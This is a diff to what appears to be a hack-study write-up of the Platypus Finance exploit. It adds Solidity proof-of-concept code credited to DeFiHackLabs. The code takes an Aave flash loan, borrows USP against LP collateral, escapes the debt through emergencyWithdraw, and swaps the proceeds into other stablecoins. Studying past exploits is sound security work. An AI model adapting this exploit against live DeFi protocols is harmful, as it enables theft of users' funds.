@@ -98,16 +98,81 @@ settling any outstanding debt they might have incurred while using the protocol.
 
 1. `Flashloan` 44 Million USDC from Aave
 2. `Deposit` the borrowed USDC into the `platypus` pool to get LP tokens
-3. Receive LP tokens
 4. `Deposit` LP tokens to the `masterPlatypus` contract as **collateral**
-5. `Borrow` as much USP as possible against the LP collateral
-6. Execute `emergencyWithdraw` to get the LP collateral back without paying debt
-   
+5. `Borrow` as much **USP** as possible against the LP collateral
+6. Execute `emergencyWithdraw` to get the LP collateral back **without** paying debt
 
 
 
 
-**Code provided by:** [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/88mph_exp.sol)
+### Flashloan
+```solidity
+     function testExploit() external {
+          aaveV3.flashLoanSimple(address(this), address(USDC), 44_000_000 * 1e6, new bytes(0), 0);
+     }
+```
+
+### Flashloan fallback
+```solidity
+     function executeOperation(
+        address asset,
+        uint256 amount,
+        uint256 premium,
+        address initator,
+        bytes calldata params
+    ) external returns (bool) {
+        USDC.approve(address(aaveV3), amount + premium);
+        USDC.approve(address(Pool), amount);
+
+        //step 2: deposit the borrowed USDC into the platypus pool to get LP tokens.
+        Pool.deposit(address(USDC), amount, address(this), block.timestamp); // deposit USDC to LP-USDC
+
+
+        uint256 LPUSDCAmount = LPUSDC.balanceOf(address(this));
+        LPUSDC.approve(address(Master), LPUSDCAmount);
+
+        //step 3: deposit LP tokens to the masterPlatypus contract as collateral
+        Master.deposit(4, LPUSDCAmount); // deposit LP-USDC to MasterPlatypus
+
+
+        PlatypusTreasure.PositionView memory Position = Treasure.positionView(address(this), address(LPUSDC));
+        uint256 borrowAmount = Position.borrowLimitUSP;
+
+        //step 4: borrow as much USP as possible against the LP collateral
+        Treasure.borrow(address(LPUSDC), borrowAmount); // borrow USP from Treasure
+
+        //step 5: execute emergecyWithdraw to get the LP colletral back wihtout paying debt
+        Master.emergencyWithdraw(4);
+
+
+        LPUSDC.approve(address(Pool), LPUSDC.balanceOf(address(this)));
+
+        // step 6: use the LP tokens to withdraw the USDC initisially borrowed from aava to pay back flashloan.
+        Pool.withdraw(address(USDC), LPUSDC.balanceOf(address(this)), 0, address(this), block.timestamp); // withdraw USDC from LP-USDC
+
+        // swap USP for playtupuis pool liquidity in form of other
+        swapUSPToOtherToken();
+        return true;
+    }
+
+      function swapUSPToOtherToken() internal {
+        USP.approve(address(Pool), 9_000_000 * 1e18);
+        Pool.swap(address(USP), address(USDC), 2_500_000 * 1e18, 0, address(this), block.timestamp);
+        Pool.swap(address(USP), address(USDC_E), 2_000_000 * 1e18, 0, address(this), block.timestamp);
+        Pool.swap(address(USP), address(USDT), 1_600_000 * 1e18, 0, address(this), block.timestamp);
+        Pool.swap(address(USP), address(USDT_E), 1_250_000 * 1e18, 0, address(this), block.timestamp);
+        Pool.swap(address(USP), address(BUSD), 700_000 * 1e18, 0, address(this), block.timestamp);
+        Pool.swap(address(USP), address(DAI_E), 700_000 * 1e18, 0, address(this), block.timestamp);
+    }
+```
+
+
+
+
+
+
+
+**Code provided by:** [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/Platypus_exp.sol)
 
 
 [**< Back**](https://patronasxdxd.github.io/CTFS/)
